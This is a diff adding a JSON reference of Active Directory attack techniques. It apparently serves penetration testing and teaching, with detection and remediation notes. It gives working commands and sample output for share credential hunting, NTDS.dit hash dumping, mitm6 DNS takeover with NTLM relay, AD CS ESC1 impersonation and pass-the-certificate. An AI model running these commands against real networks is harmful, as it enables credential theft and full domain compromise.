@@ -1,0 +1,311 @@
+[
+  {
+    "id": "netexec-spider",
+    "tool": "netexec",
+    "category": "active_directory",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "netexec smb <target> -u user -p pass --spider C$ --regex '(password|credential|secret)'",
+    "name": "SMB Spider (File Search)",
+    "description": "Recursively searches SMB shares for files matching regex patterns.",
+    "arguments": {
+      "--spider C$": "Crawl C$ share",
+      "--regex": "Search pattern"
+    },
+    "expected_output": "[+] //target/C$/Users/admin/Desktop/passwords.txt\n[+] //target/C$/Scripts/deploy_creds.ps1",
+    "use_case": "Find sensitive files (passwords, credentials, configs) across network shares.",
+    "prerequisites": [
+      "Admin access to shares"
+    ],
+    "mitre_mapping": [
+      "T1039",
+      "T1552"
+    ],
+    "mitre_tactic": "Collection",
+    "detections": [
+      "Mass file access on shares",
+      "Regex-based file searching"
+    ],
+    "remediation": [
+      "Remove sensitive files from shares",
+      "DLP"
+    ],
+    "common_mistakes": [
+      "Not trying other shares (SYSVOL, NETLOGON)"
+    ],
+    "alternatives": [
+      "snaffler",
+      "manspider"
+    ],
+    "references": [
+      "https://github.com/Pennyw0rth/NetExec"
+    ],
+    "tags": [
+      "spider",
+      "file-search",
+      "credentials",
+      "shares"
+    ]
+  },
+  {
+    "id": "netexec-ntds",
+    "tool": "netexec",
+    "category": "active_directory",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "netexec smb <dc_ip> -u admin -p pass --ntds",
+    "name": "Dump NTDS.dit (All Domain Hashes)",
+    "description": "Remotely dumps all domain password hashes from NTDS.dit via VSS.",
+    "arguments": {
+      "--ntds": "Dump NTDS.dit using Volume Shadow Copy"
+    },
+    "expected_output": "Administrator:500:aad3b435...:fc525c96...:::\nkrbtgt:502:aad3b435...:4a889942...:::",
+    "use_case": "Extract every domain account hash \u2014 complete domain compromise.",
+    "prerequisites": [
+      "Domain Admin credentials",
+      "SMB access to DC"
+    ],
+    "mitre_mapping": [
+      "T1003.003"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "VSS creation on DC",
+      "NTDS.dit access events"
+    ],
+    "remediation": [
+      "Monitor VSS operations on DCs",
+      "Restrict DA usage"
+    ],
+    "common_mistakes": [
+      "Not having DA rights"
+    ],
+    "alternatives": [
+      "impacket-secretsdump",
+      "ntdsutil"
+    ],
+    "references": [
+      "https://github.com/Pennyw0rth/NetExec"
+    ],
+    "tags": [
+      "ntds",
+      "domain",
+      "all-hashes",
+      "dcsync",
+      "complete"
+    ]
+  },
+  {
+    "id": "mitm6-attack",
+    "tool": "mitm6",
+    "category": "active_directory",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "mitm6 -d <domain> & impacket-ntlmrelayx -6 -t ldaps://<dc_ip> --delegate-access",
+    "name": "IPv6 DNS Takeover",
+    "description": "Exploits IPv6 to become the DNS server, then relays authentication for delegation access.",
+    "arguments": {
+      "mitm6": "IPv6 DNS poisoning",
+      "ntlmrelayx -6": "Relay IPv6 auth",
+      "--delegate-access": "Create computer with delegation"
+    },
+    "expected_output": "[*] IPv6 DNS takeover active\n[+] Relayed auth: CORP\\PC01$\n[+] Created computer with delegation rights",
+    "use_case": "Combine IPv6 poisoning with NTLM relay for domain escalation \u2014 very effective in modern AD.",
+    "prerequisites": [
+      "IPv6 enabled (default)",
+      "LDAPS on DC"
+    ],
+    "mitre_mapping": [
+      "T1557",
+      "T1187"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "IPv6 DNS responses from non-DC",
+      "New computer objects",
+      "Delegation changes"
+    ],
+    "remediation": [
+      "Disable IPv6 if not needed",
+      "Enable LDAP signing",
+      "Monitor computer object creation"
+    ],
+    "common_mistakes": [
+      "IPv6 disabled",
+      "LDAP signing enforced"
+    ],
+    "alternatives": [
+      "Responder (IPv4 only)",
+      "PetitPotam"
+    ],
+    "references": [
+      "https://github.com/dirkjanm/mitm6"
+    ],
+    "tags": [
+      "ipv6",
+      "dns",
+      "relay",
+      "delegation",
+      "takeover"
+    ]
+  },
+  {
+    "id": "snaffler-search",
+    "tool": "snaffler",
+    "category": "active_directory",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "Snaffler.exe -s -o snaffler_results.txt",
+    "name": "Snaffler (Credential Finder)",
+    "description": "Automatically finds sensitive files across all readable shares \u2014 passwords, keys, configs.",
+    "arguments": {
+      "-s": "Stdout output",
+      "-o": "Output file"
+    },
+    "expected_output": "[Black] \\\\DC01\\SYSVOL\\scripts\\deploy.ps1 (contains: password=)\n[Red] \\\\FS01\\HR\\salaries.xlsx",
+    "use_case": "Automated credential hunting across network shares \u2014 much faster than manual searching.",
+    "prerequisites": [
+      "Domain user credentials",
+      "Network share access"
+    ],
+    "mitre_mapping": [
+      "T1552",
+      "T1039"
+    ],
+    "mitre_tactic": "Collection",
+    "detections": [
+      "Mass share enumeration",
+      "File access patterns"
+    ],
+    "remediation": [
+      "Remove credentials from shares",
+      "DLP monitoring"
+    ],
+    "common_mistakes": [
+      "Not running as domain user"
+    ],
+    "alternatives": [
+      "netexec --spider",
+      "manspider"
+    ],
+    "references": [
+      "https://github.com/SnaffCon/Snaffler"
+    ],
+    "tags": [
+      "snaffler",
+      "credentials",
+      "shares",
+      "automated",
+      "hunting"
+    ]
+  },
+  {
+    "id": "adcs-esc1",
+    "tool": "certipy",
+    "category": "active_directory",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local",
+    "name": "AD CS ESC1 Exploitation",
+    "description": "Exploits ESC1 misconfiguration to request a certificate as any user (e.g., Administrator).",
+    "arguments": {
+      "-ca": "Certificate Authority",
+      "-template": "Vulnerable template",
+      "-upn": "Target user to impersonate"
+    },
+    "expected_output": "[*] Certificate for 'administrator@corp.local' saved to admin.pfx",
+    "use_case": "Request a certificate impersonating Domain Admin \u2014 then use it for authentication.",
+    "prerequisites": [
+      "ESC1 vulnerable template found (certipy find)",
+      "Valid domain credentials"
+    ],
+    "mitre_mapping": [
+      "T1649"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "Certificate request with different UPN",
+      "Unusual template usage"
+    ],
+    "remediation": [
+      "Fix template permissions",
+      "Disable SAN specification",
+      "Audit CA templates"
+    ],
+    "common_mistakes": [
+      "Template not vulnerable",
+      "CA denies request"
+    ],
+    "alternatives": [
+      "Certify.exe (Windows)"
+    ],
+    "references": [
+      "https://github.com/ly4k/Certipy"
+    ],
+    "tags": [
+      "adcs",
+      "esc1",
+      "certificate",
+      "impersonation",
+      "domain-admin"
+    ]
+  },
+  {
+    "id": "pass-the-cert",
+    "tool": "certipy",
+    "category": "active_directory",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "certipy auth -pfx admin.pfx -dc-ip <dc_ip>",
+    "name": "Pass-the-Certificate",
+    "description": "Authenticates using a certificate (PFX) to get a TGT \u2014 no password needed.",
+    "arguments": {
+      "-pfx": "Certificate file",
+      "-dc-ip": "Domain controller"
+    },
+    "expected_output": "[*] Got TGT for administrator@corp.local\n[*] Saved to administrator.ccache",
+    "use_case": "Use a forged/stolen certificate to authenticate as any user.",
+    "prerequisites": [
+      "Valid certificate (PFX file)",
+      "DC accessible"
+    ],
+    "mitre_mapping": [
+      "T1649"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "Certificate-based authentication from unusual source"
+    ],
+    "remediation": [
+      "Monitor certificate usage",
+      "Revoke compromised certificates"
+    ],
+    "common_mistakes": [
+      "Certificate expired or revoked"
+    ],
+    "alternatives": [
+      "Rubeus asktgt /certificate:"
+    ],
+    "references": [
+      "https://github.com/ly4k/Certipy"
+    ],
+    "tags": [
+      "certificate",
+      "authentication",
+      "tgt",
+      "pass-the-cert"
+    ]
+  }
+]
